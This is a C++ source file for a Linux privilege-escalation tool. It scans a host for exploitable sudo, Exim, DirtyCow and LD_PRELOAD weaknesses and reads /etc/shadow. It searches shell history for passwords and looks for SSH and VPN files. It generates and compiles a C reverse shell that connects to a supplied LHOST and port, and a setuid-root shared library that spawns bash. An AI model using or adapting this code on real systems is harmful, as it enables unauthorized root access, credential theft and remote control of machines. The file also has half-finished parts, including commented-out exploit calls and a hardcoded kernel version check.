#include "CVE-2015-5602-sudo.cpp"
#include "dirtyCowExploit.cpp"
#include "exim_exploit.cpp"
#include "LD_preload.cpp"
#include "LD_LIBRARY_PATH.cpp"
#include <bits/stdc++.h>
#include <csignal>
#include <fstream>
#include <iostream>
#include <map>
#include <sstream>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <string>
#include <sys/utsname.h>
#include <unistd.h>
#include <vector>
#define EXIT_FAILURE 1
#define EXIT_SUCCESS 0
#define _NLINE putchar('\n');
/*
 * TODO: 
 *
 * 
 * 1) 15/11/2023 - Fixed the ExploitSummary, now completely dynamic 
 * 2) Refactor Code
 *
 *
 * */

std::map<int, std::string> ExploitSum;
std::map<std::pair<int, std::string>, std::string> DynMap; 

struct ExploitSummaryStruct{
    int integerValue = 0;
    std::string description;
    std::string function; 

};

std::vector<ExploitSummaryStruct> ExploitVec;


void addToExploitTable(int integerValue, std::string description, std::string function)
{
    ExploitSummaryStruct newEntry;
    newEntry.integerValue = ExploitVec.size() + 1;
    newEntry.description = description;
    newEntry.function = function; //function pointer??
    ExploitVec.push_back(newEntry);
}

void ExploitSummary(void) {
  int answer;
  std::string selectDescription;
  std::string selectFunction;
  std::string secondanswer;

  std::cout << ("\n-----------------------------------------------\n");
  std::cout << "Exploitable Vulnerabilities" << std::endl;
  std::cout << ("------------------------------------------------\n");



      

      for (const ExploitSummaryStruct entry: ExploitVec)
      {
    
          std::cout << entry.integerValue << ") " << entry.description << " " << entry.function << std::endl;
          //selectNumber = entry.integerValue;
          //selectDescription = entry.description;
          //selectFunction = entry.function;


      }
    
      std::cout << "\n-----------------------------------------\n" << std::endl;
      std::cout << "Select an Exploit" << std::endl;
      std::cout << "> ";
 
      std::cin >> answer;
     

    for (const ExploitSummaryStruct entry: ExploitVec)
    {


      if (answer == entry.integerValue )
      {
          std::cout << "You Selected: " << entry.integerValue << " " << entry.description << " " << entry.function << std::endl;
          _NLINE;
          std::cout << "Are you sure? [Y/N]?" << std::endl;
          std::cout << "> ";
          std::cin >> secondanswer;
          if (secondanswer == "Y" || secondanswer == "y" || secondanswer == "yes")
          {

            if (entry.description.find("CVE-2016-5195") != std::string::npos)
            {
                std::cout << "Exploiting DirtyCow" << std::endl;
                // DirtyCowExploit();
            }
            if (entry.description.find("CVE-2015-5602") != std::string::npos )
            {
                std::cout << "Exploiting Sudo Exploit" << std::endl;
                // sudoCVE();
            }
            if (entry.description.find("CVE-2016-1531") != std::string::npos)
            {
                std::cout << "Exploiting Exim" << std::endl;
                // exim_payload();
            }
            if (entry.description.find("LD_PRELOAD") != std::string::npos)
            {
                std::cout << "Exploiting LD_PRELOAD " << std::endl;
                // LD_PRELOAD_SHELL();
            }
            if (entry.description.find("LD_LIBRARY_PATH") != std::string::npos)
            {
                std::cout << "Exploiting LD_LIBRARY_PATH" << std::endl;
                // LD_LIBRARY_PATH_SHELL();
            }

          }
          else 
          {
              ExploitSummary();
          }

      }
      else
      {
          continue;
      }

    }  
}
      
     
     
     


        
    
    

  


bool CheckIfFileExists(std::string test) {
  std::ofstream file;
  file.open(test);

  if (file) {
    return true;
  } else {

    return false;
  }
}



bool CheckIfStraceExists(std::string test1) {
    std::system("which strace > /tmp/strace.txt 2>/dev/null");
    std::ifstream stracefile;
    stracefile.open("/tmp/strace.txt");
    if (stracefile.is_open())
    {
        std::string data; 
        while(getline(stracefile,data))
        {
            if (data.find("[-] strace not found") != std::string::npos)
            {
                return false;
            }
            else
            {
                return true;
            }
        }
    }
    
    {
        return false; 
    }


}





void DirtyCowCheck(void) {
  // char speechMark = '"';

  struct utsname version;
  int newVersion;
  std::string release;

  if (uname(&version) == -1) {
    std::cout << "Failed" << std::endl;
  } else {
    (EXIT_FAILURE);
  }

  release.push_back(version.release[0]);
  release.push_back(version.release[2]);

  std::stringstream obj;

  obj << release;
  obj >> newVersion;
  int newVersion1 = 33;

  if (newVersion1 >= 50) {
    std::cout << "[-] DirtyCow Attack not compatible\n" << std::endl;

  } else {
    //std::cout
    //    << "[+] DirtyCow Attack Compatible [CVE 2016-5195(DirtyCow) Exploit]"
    //    << std::endl;
    //ExploitSum[3] = "CVE 2016-5195(DirtyCow) Exploit";
      addToExploitTable(0, "CVE-2016-5195(DirtyCow Exploit)", " ");
      addToExploitTable(0, "LastExploit", " ");

  }
}




int writeLibrary(void)
{
    
        std::cout << "Shared Object Library Code" << std::endl;  
    std::cout << "-----------------------------------" << std::endl;
    putchar('\n');
    std::string payload = "#include <stdio.h>\n"
                        "#include <sys/socket.h>\n"
                        "#include <sys/types.h>\n"
                        "#include <stdlib.h>\n"
                        "#include <unistd.h>\n"
                        "#include <netinet/in.h>\n"
                        "#include <arpa/inet.h>\n"

                        "void inject()\n"
                        "{\n"
                        "    setuid(0);\n"
                        "    system(\"/bin/bash -p\");\n"
                        "}\n";

  std::cout << payload << std::endl;
  putchar('\n');
  std::cout << "--------------------------------------" << std::endl;

  putchar('\n');
  std::cout << "[+] DOUBLE CHECK THE PAYLOAD, HAPPY?[Y/N]: ";
  std::string answer;
  std::cin >> answer;
  if (answer == "Y") {
    std::cout << "\n[+] SAVING PAYLOAD" << std::endl;
    std::ofstream outf{"LibraryShell.c"};
    if (!outf) {
      std::cerr << "[!] ERROR WRITING PAYLOAD TO FILE\n" << std::endl;
      return 1;
    } else {
      outf << payload;
      try {
        int pid = fork();
        if (pid == 0) {
          std::system("gcc -shared -fPIC -o LibraryShell.so LibraryShell.c");
          exit(EXIT_SUCCESS);
        }
      } catch (int a) {
        std::cerr << "[!] ERROR COMPILING C PAYLOAD VIA GCC" << a << std::endl;
      }
    }
  } else {
    exit(EXIT_FAILURE);
  }
  return 0;
    
    exit(EXIT_SUCCESS);
}



int writeShellNew(std::string lhost, std::string lport)
{
    _NLINE;
    char QuotationMark = '"';
    std::cout << "-----------------------------------" << std::endl;
    putchar('\n');
    std::string payload = "#include <stdio.h>\n"
                        "#include <sys/socket.h>\n"
                        "#include <sys/types.h>\n"
                        "#include <stdlib.h>\n"
                        "#include <unistd.h>\n"
                        "#include <netinet/in.h>\n"
                        "#include <arpa/inet.h>\n"

                        "int main(void)\n"
                        "{\n"
                        "    int port = " +
                        lport +
                        ";\n"
                        "    struct sockaddr_in revsockaddr;\n"
                        "    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n"
                        "    revsockaddr.sin_family = AF_INET;\n"
                        "    revsockaddr.sin_port = htons(port);\n"
                        "    revsockaddr.sin_addr.s_addr = inet_addr(" +QuotationMark + "" + lhost + "" + QuotationMark +");\n"
                        "    connect(sockt, (struct sockaddr *) &revsockaddr,\n"
                        "    sizeof(revsockaddr));\n"
                        "    dup2(sockt, 0);\n"
                        "    dup2(sockt, 1);\n"
                        "    dup2(sockt, 2);\n"
                        "    char * const argv[] = {" +
                        QuotationMark +
                        ""
                        "/bin/sh" +
                        QuotationMark +
                        ", NULL};\n"
                        "    execve(" +
                        QuotationMark +
                        ""
                        "/bin/sh" +
                        QuotationMark +
                        ", argv, NULL);\n"
                        "    return 0;\n"
                        "}\n";

  std::cout << payload << std::endl;
  putchar('\n');
  std::cout << "--------------------------------------" << std::endl;

  putchar('\n');
  std::cout << "[+] DOUBLE CHECK THE PAYLOAD, HAPPY?[Y/N]: ";
  std::string answer;
  std::cin >> answer;
  if (answer == "Y" || answer == "y" || answer == "Yes" || answer == "yes") {
    std::cout << "\n[+] SAVING PAYLOAD" << std::endl;
    std::ofstream outf{"shell.c"};
    if (!outf) {
      std::cerr << "[!] ERROR WRITING PAYLOAD TO FILE\n" << std::endl;
      return 1;
    } else {
      outf << payload;
      try {
        int pid = fork();
        if (pid == 0) {
          std::system("gcc shell.c -o shell");
          exit(EXIT_SUCCESS);
        }
      } catch (int a) {
        std::cerr << "[!] ERROR COMPILING C PAYLOAD VIA GCC" << a << std::endl;
      }
    }
  } else {
    exit(EXIT_FAILURE);
  }
  return 0;

  
}

int Parser(char *argv[]) // Parses LHOST and LPORT from main
{
  putchar('\n');
  std::string parameter = argv[1];
  std::string lhost = argv[2];
  std::string lport = argv[3];
  int lhostlen = lhost.length();
  char lhostArray[lhostlen];
  char lportArray[11];

  lhost.copy(lhostArray, lhostlen);
  lport.copy(lportArray, 11);
  std::string equalhost;
  std::string equalport;
  equalhost.push_back(lhostArray[5]);

  if (equalhost != "=") {
    std::cout << "LHOST ERROR. Please use LHOST=" << std::endl;
    exit(EXIT_FAILURE);
  }

  equalport.push_back(lportArray[5]);

  if (equalport != "=") {
    std::cout << "LPORT ERROR. Please use LPORT=" << std::endl;
    exit(EXIT_FAILURE);
  }
  
  lhost.erase(0,6);
  lport.erase(0,6);


  if (std::string(argv[1]) == "-shell")
  {
    writeShellNew(lhost, lport);
  }

  return 0;
}


void SysInfo(void) {
  std::cout << ("\n-----------------------------------------------\n");
  std::system("hostnamectl");
  std::cout << ("------------------------------------------------\n");
}

void WFP(void) {
    
    std::cout << "[+] Weak File Permissions" << std::endl;
    _NLINE;
    std::map<std::string, std::string> CommandsMap;
    CommandsMap["cat -n /$HOME/../../etc/passwd"] = "/etc/passwd";
    CommandsMap["cat -n /$HOME/../../etc/shadow"] = "/etc/shadow";
    CommandsMap["cat -n /$HOME/../../etc/pwd.db"] = "/etc/pwd.db";
    CommandsMap["cat -n /$HOME/../../etc/master.passwd"] = "/etc/master.passwd";
    for (const auto& i:  CommandsMap)
    {
        std::cout << i.second << std::endl;
        _NLINE;
        std::system((i.first).c_str());
        _NLINE;
    }
     std::system("grep -v '^[^:]*:[x\\*]' /etc/passwd /etc/pwd.db "
              "/etc/master.passwd /etc/group 2>/dev/null");
  // std::system("for d in `echo $PATH | tr ":" "\\n"`; do find $d -name "*.sh"
  // 2>/dev/null; done for d in `echo $PATH | tr ":" "\\n"`; do find $d -type -f
  // -executable 2>/dev/null; done"); // Scripts or binaries in PATH
    _NLINE
}

void cronTab(void) {
  std::cout << "[+] Finding CRONTAB schedule..." << std::endl;
  std::system("ls -al /$HOME/../../etc/crontab");
  std::cout << std::endl;
}

void PasswordsAndKeys(void) {
    _NLINE;
    std::cout << "[+] Searching for Passwords and Keys..." << std::endl;
    _NLINE;
    std::vector<std::string> commands = {" ~/.*history | grep -e \"-p\" ", 
                                       "~/.*history | grep -e \"-pass\"",
                                       "~/.*history | grep -e \"-password\"", 
                                       "find ~/ -name \"*.vpn\"",
                                       "find ~/ -name \"*.ssh\""};

    for (const auto& x: commands)
    {
        std::cout << x << std::endl;
        _NLINE;
        std::system((x).c_str());
    }

}

void FindAllsuid(void) {
  std::cout << "[+] Finding all SUID/GUID Executables..." << std::endl;
  std::cout << "" << std::endl;
  // std::system("find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls -l
  // {} \\; 2> /dev/null"); // EXPORT THIS OUTPUT TO FILE AND THEN READ CONTENTS
  // RATHER THAN DOING TO VARIABLE
  std::system("find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls  {} "
              "\\; 2> /dev/null > root_files.txt");
  // std::system("sudo -V | grep \"Sudo version\" >> root_files.txt");
  std::system("echo \"Sudo version 1.8.13\" >> root_files.txt"); // USE FOR TESTING
  // std::system("echo \"/usr/bin/exim-4.81\" >> root_files.txt "); USE FOR TESTING
  std::system("cat root_files.txt");
  putchar('\n');

  std::ifstream root_files;
  root_files.open("root_files.txt");

  if (root_files.is_open()) {
    // std::cout << "RootFile is open" << std::endl;
    std::string data;
    std::string exim;

    // Runs with the root_files list and tries to find vulnerable exim.
    while (getline(root_files, data)) {
        if (data.find("/usr/bin/exim-") != std::string::npos) { // /usr/sbin/exim-4.84-3  | /usr/bin/exim-4.84-3 |
                    

        char exim[data.length() + 1];
        // char exim_test[] = "4.84";

        // strcpy(exim, data.c_str());

        for (int i = 14; i < data.length(); i++) {
            exim[i - 14] = data[i];
        }

        double test = std::stod(exim);

        // std::cout << "Exim test: " << test << std::endl;
        // std::cout << "Exim: " << exim << std::endl;

        if (test <= 4.84) {

          std::cout << "[+] Found Exploitable [CVE-2016-1531 exim <= 4.84-3 "
                       "local root exploit]"
                    << std::endl;
          //ExploitSum[2] = "CVE-2016-1531 exim <= 4.84-3 local root exploit";
          addToExploitTable(0, "CVE-2016-1531 exim <= 4.84-3 local root exploit", " ");

        }
        // putchar('\n');
      }
        if (data.find("usr/sbin/exim-") != std::string::npos)
        {
            char exim[data.length()];
        // char exim_test[] = "4.84";

        // strcpy(exim, data.c_str());

        for (int i = 15; i < data.length(); i++) {
            exim[i - 15] = data[i];
        }

        double test = std::stod(exim);

        // std::cout << "Exim test: " << test << std::endl;
        // std::cout << "Exim: " << exim << std::endl;

        if (test <= 4.84) {

          std::cout << "[+] Found Exploitable [CVE-2016-1531 exim <= 4.84-3 "
                       "local root exploit]"
                    << std::endl;
          ExploitSum[2] = "CVE-2016-1531 exim <= 4.84-3 local root exploit";

        }
        }

         if (data.find("Sudo version ") !=
          std::string::npos) // Sudo version 1.9.12p2
      {
        // std::cout << "Found SUDO Version: " << data << std::endl;
        char sudo[data.length() + 1];
        // char exim_test[] = "4.84";

        // strcpy(exim, data.c_str());

        for (int i = 13; i < data.length(); i++) {
          sudo[i - 13] = data[i];
        }

        double sudoTest = std::stod(sudo);

        // std::cout << "Exim test: " << test << std::endl;
        // std::cout << "sudo: " << sudoTest << std::endl;

        if (sudoTest <= 1.8) {

          std::cout << "[+] Found Exploitable SUDO [Sudo <= 1.8.14 Local "
                       "Privilege Escalation]"
                    << std::endl;
          //ExploitSum[1] = "Sudo <= 1.8.14 Local Privilege Escalation";
          addToExploitTable(0, "CVE-2015-5602 Sudo <= 1.8.14 Local Privilege Escalation", " ");
          // JUST SCANNING

        } else {

          std::cout << "Exploit Not Valid [SUDO]" << std::endl;
        }
      }
    }

  } else

  {
    std::cout << "RootFile is not open" << std::endl;
  }

  std::system("rm root_files.txt");

  putchar('\n');
}

void sharedObjectLibraryInjection(void) {

  std::string stracePath = "usr/bin/strace";
  CheckIfStraceExists(stracePath);
  // std::cout << "Check file is: " << CheckIfFileExists << std::endl;

  if (CheckIfStraceExists(stracePath) == true) {
        std::system("rm /tmp/strace.txt");
        std::cout << "[+] " << stracePath << " Found, Proceeding with Shared Object Library Injection\n" << std::endl;
        // strace stuff
        std::system("find / -type f -a \\( -perm -u+s -o -perm -g+s \\) -exec ls  "
                "{} \\; 2> /dev/null > root_files.txt");
        std::ifstream root_files;
        root_files.open("root_files.txt");

        if (root_files.is_open()) {
            std::string data;
             while (getline(root_files, data)) {
                if (data.find("/") != std::string::npos){
                    std::cout << "strace " + data  << std::endl;
                    std::system(("strace " + data + " 2>&1 | grep -iE \"home\" | grep -iE \"open|access|no such file\" ").c_str());
                    

                }
                    
                }
            }
        }
    

     else {
    std::cout << "[-] " << stracePath
              << " Not Found, Skipping Shared Object Library Injection"
              << std::endl;
  }
}

void SudoL(void) {


    putchar('\n');
    std::system("sudo -l > sudoL.txt");
    
    std::ifstream sudoLfile; 

    sudoLfile.open("sudoL.txt");

    if (sudoLfile.is_open())
    {

        std::string data;
        std::string LD_PRELOAD_FLAG;
        std::string LD_LIBRARY_PATH_FLAG;
        while(getline(sudoLfile, data))
        {

            if (data.find("env_keep+=LD_PRELOAD") != std::string::npos)
            {
                std::cout << "[+] Located Vulnerable Enviroment Variable [LD_PRELOAD]\n" << std::endl;
                //ExploitSum[4] = "LD_PRELOAD Library Injection";
                addToExploitTable(0, "LD_PRELOAD Library Injection", " ");
                LD_PRELOAD_FLAG = "A";
            }
            if (data.find("env_keep+=LD_LIBRARY_PATH") != std::string::npos)
            {
                
                std::cout << "[+] Located Vulnerable Enviroment Variable [LD_LIBRARY_PATH]\n" << std::endl;
                //ExploitSum[5] = "LD_LIBRARY_PATH Library Injection";
                addToExploitTable(0, "LD_LIBRARY_PATH Library Injection", " ");
                LD_LIBRARY_PATH_FLAG = "B";
            }

        }
        if (LD_PRELOAD_FLAG != "A")
        {
            std::cout << "[-] Cannot find vulnerable LD_LIBRARY_PATH FAIL\n" << std::endl;
        }
        if (LD_LIBRARY_PATH_FLAG != "B")
        {  
            std::cout << "[-] Cannot find vulnerable LD_PRELOAD FAIL\n" << std::endl;
        }

    }
    else {
        std::cout << "Unable to open sudoL file\n";
    }

    std::system("rm sudoL.txt");

}

int main(int argc, char *argv[]) {
    std::string sudoPass;

    addToExploitTable(0, "test", "test");
    int argFlag = 0;
    std::string help =  "\n-Scan [scan for escalation]\n"
                     "-shell [Generated a Reverse Shell in C] usage: "
                     "./privesc -shell LHOST=<IP> LPORT=<PORT>\n"
                     "-library [Generated a Shared Object Library which executes /bin/sh -p]";

    if (argc == 1) 
    {
        std::cout << "No Argument supplied\n" << help << std::endl;
        exit(EXIT_SUCCESS);
    }
  
    if (std::string(argv[1]) == "-h" || std::string(argv[1]) == "/?" || std::string(argv[1]) == "-help") 
    {
        std::cout << help << std::endl;
        putchar('\n');
        exit(EXIT_SUCCESS);
    }
  
    if (std::string(argv[1]) == "-scan") 
    {
        std::cout << "\nScan Mode" << std::endl;

        SysInfo();
        WFP();
        cronTab();
        PasswordsAndKeys();
        FindAllsuid();
        DirtyCowCheck();
        sharedObjectLibraryInjection();
        SudoL();
        ExploitSummary();

        exit(EXIT_SUCCESS);
    }

    if (std::string(argv[1]) == "-shell") 
    {
        if (argv[2] != NULL) 
        {
            argFlag++;
        } 
        else 
        {
            std::cout << "Please provide LHOST" << std::endl;
        }
        if (argv[3] != NULL) 
        {
            argFlag++;
        } 
        else 
        {
            std::cout << "Please provide LPORT" << std::endl;
        }
        if (argFlag != 2) 
        {
            std::cout << "[!] Incorrect Settings, Did you mean -shell LHOST=<IP> LPORT=<PORT>" << std::endl; 
            exit(EXIT_FAILURE);
        } 
        else 
        {
            Parser(argv);
            exit(EXIT_SUCCESS);
        }

    }
    if (std::string(argv[1]) == "-library") 
    {
        writeLibrary();
        exit(EXIT_SUCCESS);
    } 
    else 
    {
        std::cout << "Settings incorrect\n" << help << std::endl;
        exit(EXIT_FAILURE);
    }
    
    if (std::string(argv[1]) != "-scan" || std::string(argv[1]) != "-shell" || std::string(argv[1]) != "-library" ) 
    {
        std::cout << "Invalid Arguments" << std::endl;
        exit(EXIT_FAILURE);
    }



  return 0;
}
